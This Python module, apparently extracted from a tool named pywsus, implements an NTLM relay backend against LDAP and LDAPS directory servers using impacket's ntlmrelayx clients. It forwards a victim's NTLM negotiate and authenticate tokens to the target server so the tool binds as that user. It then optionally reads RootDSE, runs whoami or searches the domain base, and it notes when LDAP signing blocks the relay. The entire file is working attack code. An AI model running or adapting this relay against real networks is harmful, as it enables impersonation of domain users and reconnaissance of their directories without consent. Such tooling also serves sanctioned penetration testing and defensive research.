# Auto-extracted from pywsus.py: LDAP / LDAPS relay backend.

import base64
import http.client
import re
import ssl
import threading
import time
import uuid
from urllib.parse import quote, urlparse

from ._common import NTLM_SESSION_TTL


class _LDAPRelayConfig:
    """Small ntlmrelayx-compatible config object for LDAP relay clients."""

    remove_mic = False
    remove_sign_seal = False


class LDAPNTLMRelayBackend:
    ROOTDSE_ATTRIBUTES = (
        "defaultNamingContext",
        "dnsHostName",
        "namingContexts",
        "supportedLDAPVersion",
        "supportedSASLMechanisms",
        "vendorName",
    )

    def __init__(self, target_url, timeout=10, action="auth-only"):
        self.target_url = target_url
        self.timeout = timeout
        self.action = action
        self.sessions = {}
        self.lock = threading.RLock()

        parsed = urlparse(target_url)
        if parsed.scheme not in ("ldap", "ldaps") or not parsed.hostname:
            raise ValueError("LDAP relay target must be ldap:// or ldaps://")

        self.target = parsed
        self.scheme = parsed.scheme
        self.host = parsed.hostname
        self.port = parsed.port or (636 if parsed.scheme == "ldaps" else 389)

    def _load_impacket(self):
        try:
            from impacket.examples.ntlmrelayx.clients.ldaprelayclient import (  # type: ignore
                LDAPRelayClient,
                LDAPRelayClientException,
                LDAPSRelayClient,
            )
            from impacket.nt_errors import ERROR_MESSAGES, STATUS_SUCCESS  # type: ignore
            from ldap3 import BASE  # type: ignore
        except ImportError as err:
            raise RuntimeError("LDAP relay requires impacket and ldap3") from err

        return (
            LDAPRelayClient,
            LDAPSRelayClient,
            LDAPRelayClientException,
            ERROR_MESSAGES,
            STATUS_SUCCESS,
            BASE,
        )

    @staticmethod
    def _decode_token(token):
        return base64.b64decode(token)

    @staticmethod
    def _status_name(error_messages, status):
        name, _ = error_messages.get(status, ("UNKNOWN", ""))
        return name

    @staticmethod
    def _ldap_value(value):
        if isinstance(value, bytes):
            return value.decode("utf-8", errors="replace")
        if isinstance(value, (list, tuple)):
            return [LDAPNTLMRelayBackend._ldap_value(item) for item in value]
        return str(value)

    @classmethod
    def _entry_attributes(cls, session):
        entries = getattr(session, "entries", []) or []
        if not entries:
            return {}

        attributes = getattr(entries[0], "entry_attributes_as_dict", {}) or {}
        return {
            key: cls._ldap_value(value)
            for key, value in attributes.items()
        }

    @staticmethod
    def _ldap_result(session):
        result = getattr(session, "result", {}) or {}
        return {
            "ldap_result_code": result.get("result", ""),
            "ldap_result_description": result.get("description", ""),
            "ldap_diagnostic_message": result.get("message", ""),
        }

    @staticmethod
    def _first_ldap_value(value):
        if isinstance(value, list):
            return value[0] if value else ""
        return value or ""

    def _new_client(self):
        (
            LDAPRelayClient,
            LDAPSRelayClient,
            _,
            _,
            _,
            _,
        ) = self._load_impacket()
        client_class = LDAPSRelayClient if self.scheme == "ldaps" else LDAPRelayClient
        return client_class(_LDAPRelayConfig(), self.target, self.port)

    def _session_info(self, client):
        return {
            "ldap_target": f"{self.host}:{self.port}",
            "ldap_transport": self.scheme,
            "ldap_server_info_available": bool(
                getattr(getattr(client, "session", None), "server", None)
            ),
        }

    def _rootdse(self, client):
        _, _, _, _, _, base_scope = self._load_impacket()
        session = client.session
        success = session.search(
            search_base="",
            search_filter="(objectClass=*)",
            search_scope=base_scope,
            attributes=list(self.ROOTDSE_ATTRIBUTES),
        )
        attributes = self._entry_attributes(session)
        result = {
            "ldap_rootdse_ok": bool(success),
            "ldap_default_naming_context": self._first_ldap_value(
                attributes.get("defaultNamingContext", "")
            ),
            "ldap_dns_host_name": self._first_ldap_value(
                attributes.get("dnsHostName", "")
            ),
            "ldap_naming_contexts": attributes.get("namingContexts", []),
            "ldap_supported_versions": attributes.get("supportedLDAPVersion", []),
            "ldap_supported_sasl_mechanisms": attributes.get(
                "supportedSASLMechanisms", []
            ),
            "ldap_vendor_name": self._first_ldap_value(
                attributes.get("vendorName", "")
            ),
        }
        result.update(self._ldap_result(session))
        return result

    def _whoami(self, client):
        session = client.session
        success = session.extend.standard.who_am_i()
        result = {
            "ldap_whoami_ok": bool(success),
            "ldap_whoami": self._ldap_value(
                (getattr(session, "result", {}) or {}).get("responseValue", "")
            ),
        }
        result.update(self._ldap_result(session))
        return result

    def _base_search(self, client):
        _, _, _, _, _, base_scope = self._load_impacket()
        rootdse = self._rootdse(client)
        base_dn = rootdse.get("ldap_default_naming_context", "")
        if not base_dn:
            return {
                **rootdse,
                "ldap_base_search_ok": False,
                "ldap_base_search_error": "defaultNamingContext was not returned",
                "ldap_base_dn": "",
                "ldap_base_object_dn": "",
                "ldap_base_object_classes": [],
            }

        session = client.session
        success = session.search(
            search_base=base_dn,
            search_filter="(objectClass=*)",
            search_scope=base_scope,
            attributes=["distinguishedName", "objectClass", "name"],
        )
        attributes = self._entry_attributes(session)
        entries = getattr(session, "entries", []) or []
        entry_dn = str(getattr(entries[0], "entry_dn", "")) if entries else ""
        result = {
            **rootdse,
            "ldap_base_search_ok": bool(success),
            "ldap_base_search_error": "",
            "ldap_base_dn": base_dn,
            "ldap_base_object_dn": entry_dn,
            "ldap_base_object_classes": attributes.get("objectClass", []),
        }
        result.update(self._ldap_result(session))
        return result

    def preflight(self):
        client = self._new_client()
        try:
            if not client.initConnection():
                raise RuntimeError("LDAP target connection failed")

            result = {
                "ldap_preflight": True,
                "authenticated": False,
                "service": "ldap",
                "service_validated": False,
                **self._session_info(client),
            }
            result.update(self._rootdse(client))
            result["service_validated"] = result["ldap_rootdse_ok"]
            return result
        finally:
            client.killConnection()

    def start_type1(self, session_key, type1_token):
        client = self._new_client()

        try:
            with self.lock:
                old_session = self.sessions.pop(session_key, None)
            if old_session:
                old_session["client"].killConnection()

            if not client.initConnection():
                raise RuntimeError("LDAP target connection failed")

            challenge = client.sendNegotiate(self._decode_token(type1_token))
            if not challenge:
                raise RuntimeError("LDAP target did not return NTLM Type 2")

            with self.lock:
                self.sessions[session_key] = {
                    "client": client,
                    "created_at": time.time(),
                    "target_status_type2": "LDAP_SICILY_NEGOTIATE_NTLM",
                    "session_info": self._session_info(client),
                }

            return base64.b64encode(challenge.getData()).decode("ascii")
        except Exception:
            client.killConnection()
            raise

    def finish_type3(self, session_key, type3_token, identity="", username=""):
        with self.lock:
            session = self.sessions.pop(session_key, None)
        if not session:
            raise RuntimeError("missing relay session for Type 3")

        client = session["client"]
        _, _, ldap_error, error_messages, status_success, _ = self._load_impacket()
        authenticated = False

        try:
            try:
                _, status = client.sendAuth(self._decode_token(type3_token))
                reason = self._status_name(error_messages, status)
                authenticated = status == status_success
                error = ""
            except ldap_error as err:
                status = None
                reason = "LDAP_RELAY_ERROR"
                authenticated = False
                error = str(err)

            result = {
                "status": status,
                "reason": reason,
                "authenticated": authenticated,
                "type3_accepted": authenticated,
                "auth_validation": "ldap-bind" if authenticated else "rejected",
                "action": self.action,
                "target_status_type2": session.get("target_status_type2"),
                "service": "ldap",
                "service_validated": authenticated,
                "identity": identity,
                "username": username,
                "ldap_action_state": "not-run",
                "ldap_action_error": error,
                "ldap_rootdse_ok": None,
                "ldap_whoami_ok": None,
                "ldap_base_search_ok": None,
                **session.get("session_info", {}),
                **self._ldap_result(client.session),
            }

            if not authenticated:
                if "signing is enabled" in error.lower():
                    result["ldap_signing_required"] = True
                return result

            if self.action == "ldap-rootdse":
                action_result = self._rootdse(client)
                result.update(action_result)
                result["ldap_action_state"] = (
                    "rootdse-read" if action_result["ldap_rootdse_ok"] else "rootdse-failed"
                )
                result["service_validated"] = action_result["ldap_rootdse_ok"]
            elif self.action == "ldap-whoami":
                action_result = self._whoami(client)
                result.update(action_result)
                result["ldap_action_state"] = (
                    "whoami-read" if action_result["ldap_whoami_ok"] else "whoami-failed"
                )
                result["service_validated"] = action_result["ldap_whoami_ok"]
            elif self.action == "ldap-base-search":
                action_result = self._base_search(client)
                result.update(action_result)
                result["ldap_action_state"] = (
                    "base-read"
                    if action_result["ldap_base_search_ok"]
                    else "base-search-failed"
                )
                result["service_validated"] = action_result["ldap_base_search_ok"]
            else:
                result["ldap_action_state"] = "auth-only"

            return result
        except Exception as err:
            return {
                "status": None,
                "reason": "LDAP_ACTION_ERROR",
                "authenticated": authenticated,
                "type3_accepted": authenticated,
                "auth_validation": "ldap-bind" if authenticated else "rejected",
                "action": self.action,
                "target_status_type2": session.get("target_status_type2"),
                "service": "ldap",
                "service_validated": False,
                "identity": identity,
                "username": username,
                "ldap_action_state": "action-error",
                "ldap_action_error": str(err),
                "ldap_rootdse_ok": None,
                "ldap_whoami_ok": None,
                "ldap_base_search_ok": None,
                **session.get("session_info", {}),
                **self._ldap_result(client.session),
            }
        finally:
            client.killConnection()

    def drop_session(self, session_key):
        with self.lock:
            session = self.sessions.pop(session_key, None)
        if session:
            session["client"].killConnection()

    def cleanup_sessions(self, max_age=NTLM_SESSION_TTL):
        now = time.time()
        with self.lock:
            stale = [
                key for key, session in self.sessions.items()
                if now - session.get("created_at", now) > max_age
            ]
            sessions = [self.sessions.pop(key) for key in stale]

        for session in sessions:
            session["client"].killConnection()

        return len(sessions)


# ---------------------------------------------------------------------------
# KB generation
# ---------------------------------------------------------------------------
